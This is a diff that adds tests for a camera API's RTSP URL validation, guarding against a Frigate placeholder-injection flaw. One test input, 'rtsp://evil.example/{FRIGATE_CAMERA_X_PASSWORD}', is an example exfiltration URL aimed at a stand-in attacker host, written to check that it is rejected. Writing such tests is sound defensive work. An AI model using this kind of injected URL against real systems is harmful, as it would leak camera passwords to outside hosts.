@@ -176,3 +176,40 @@ describe("POST /api/cameras — manual add reconciles Frigate config (#11)", () 
     expect(syncCamerasFromDb).not.toHaveBeenCalled();
   });
 });
+
+// WARP-3193 SEC-INJ-5 — Frigate expands `{FRIGATE_*}` placeholders in the
+// URL it is given, so `rtsp://evil/{FRIGATE_CAMERA_X_PASSWORD}` would send a
+// camera password to any host. Validation must also finish BEFORE the Frigate
+// write: the old code parsed the host only after addCamera(), so a URL the
+// parser rejects left Frigate configured and the DB without the row.
+describe("POST /api/cameras — rtspUrl validation (SEC-INJ-5)", () => {
+  it.each([
+    "rtsp://evil.example/{FRIGATE_CAMERA_X_PASSWORD}",
+    "rtsp://evil.example/}",
+    "rtsp://cam.local/stream 1",
+    "rtsp://cam.local/\tstream",
+    "http://192.168.1.5/stream",
+    "rtsp://[::1",
+    "rtsp:///stream",
+  ])("rejects %s with 400 before any Frigate write", async (rtspUrl) => {
+    addCamera.mockResolvedValue(true);
+    const prisma = makePrisma();
+    const res = await request(makeApp(prisma)).post("/api/cameras").send({ name: "cam", rtspUrl });
+    expect(res.status).toBe(400);
+    expect(addCamera).not.toHaveBeenCalled();
+    expect(prisma.camera.upsert).not.toHaveBeenCalled();
+  });
+
+  it("accepts credentials, a port and rtsps", async () => {
+    addCamera.mockResolvedValue(true);
+    syncCamerasFromDb.mockResolvedValue([]);
+    const prisma = makePrisma();
+    const res = await request(makeApp(prisma))
+      .post("/api/cameras")
+      .send({ name: "cam", rtspUrl: "rtsps://admin:p%40ss@192.168.100.50:322/stream1" });
+    expect(res.status).toBe(200);
+    expect(prisma.camera.upsert).toHaveBeenCalledWith(
+      expect.objectContaining({ create: expect.objectContaining({ ipAddress: "192.168.100.50" }) }),
+    );
+  });
+});
